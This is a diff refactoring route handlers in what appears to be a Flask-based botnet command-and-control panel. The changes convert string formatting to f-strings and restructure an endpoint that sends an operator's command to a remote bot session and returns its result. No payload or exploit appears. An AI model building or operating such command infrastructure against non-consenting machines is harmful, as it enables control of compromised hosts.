@@ -39,7 +39,7 @@ def session_remove():
 
 	# remove session from database
 	s = session_dao.delete_session(session_uid)
-	return "Session {} removed.".format(session_uid)
+	return f"Session {session_uid} removed."
 
 
 @session.route("/api/session/cmd", methods=["POST"])
@@ -50,7 +50,7 @@ def session_cmd():
 
 	# validate session id is valid integer
 	if not session_uid:
-		flash("Invalid bot UID: " + str(session_uid))
+		flash(f"Invalid bot UID: {str(session_uid)}")
 		return redirect(url_for('main.sessions'))
 
 	command = request.form.get('cmd')
@@ -58,22 +58,20 @@ def session_cmd():
 	# get user sessions
 	owner_sessions = c2.sessions.get(current_user.username, {})
 
-	if session_uid in owner_sessions:
-		session_thread = owner_sessions[session_uid]
+	if session_uid not in owner_sessions:
+		return f"Bot {str(session_uid)} is offline or does not exist."
+	session_thread = owner_sessions[session_uid]
 
-		# store issued task in database
-		task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
+	# store issued task in database
+	task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
 
-		# send task and get response
-		session_thread.send_task(task)
-		response = session_thread.recv_task()
+	# send task and get response
+	session_thread.send_task(task)
+	response = session_thread.recv_task()
 
-		# update task record with result in database
-		result = task_dao.handle_task(response)
-		return str(result['result']).encode()
-
-	else:
-		return "Bot " + str(session_uid) + " is offline or does not exist."
+	# update task record with result in database
+	result = task_dao.handle_task(response)
+	return str(result['result']).encode()
 
 
 @session.route("/api/session/poll", methods=["GET"])
